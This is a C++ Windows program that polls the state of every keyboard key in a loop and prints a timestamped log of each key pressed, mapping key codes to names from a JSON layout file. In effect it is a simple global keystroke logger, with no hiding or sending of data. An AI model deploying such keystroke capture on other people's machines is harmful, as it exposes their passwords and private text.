#include <windows.h>
#include <stdio.h>
#include <time.h>
#include <string>
#include "Defines.h"

#include <iostream>
#include <fstream>
#include <sstream>
#include <iterator>
#include "json-test/picojson.h"

#define WIN32_LEAN_AND_MEAN

struct KeyChecker{
  int key = 0;
  short state = 0;
  bool check = false;
  bool get(){
    if(state & 0x0001){
      if(!check){
        check = true;
        return 1;
      }
    }

    if(state & 0x8000){
    }else{
      check = false;
    }
    return 0;
  }
  std::string getChar(){
    return keyCodeToReadableString(key);
  }
};

std::string getCharFromJson(std::string file, std::string key){
  std::ifstream ifs(file, std::ios::in);

  if (ifs.fail()) {
      std::cerr << "failed to read " << file << std::endl;
      return "";
  }
  const std::string json((std::istreambuf_iterator<char>(ifs)), std::istreambuf_iterator<char>());
  ifs.close();

  picojson::value v;
  const std::string err = picojson::parse(v, json);
  if (err.empty() == false) {
      std::cerr << err << std::endl;
      return "";
  }

  picojson::object& obj = v.get<picojson::object>();

  try{
    std::string res = obj[key].get<std::string>();
    return res;
  }catch(...){
    return "";
  }
}

int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd){
  time_t now;
  struct KeyChecker KeyCheckers[sizeof(Keys) / sizeof(int)];

  for(int i = 0; i < sizeof(Keys) / sizeof(int); i++){
    KeyCheckers[i].key = Keys[i];
    KeyCheckers[i].state = GetAsyncKeyState(KeyCheckers[i].key);
    KeyCheckers[i].get();
  }

  while(true){
    for(int i = 0; i < sizeof(Keys) / sizeof(int); i++){
      KeyCheckers[i].state = GetAsyncKeyState(KeyCheckers[i].key);
    }

    for(int i = 0; i < sizeof(Keys) / sizeof(int); i++){
      if(KeyCheckers[i].get()){
        now = time(NULL);
        std::string fromJson = getCharFromJson("keyLayouts.json", std::to_string(KeyCheckers[i].key));

        if(fromJson.empty()){
          std::cout << now << " " << KeyCheckers[i].getChar().c_str() << std::endl;
        }else{
          std::cout << now << " " << fromJson << std::endl;
        }
      }
    }
  }
  return 0;
}
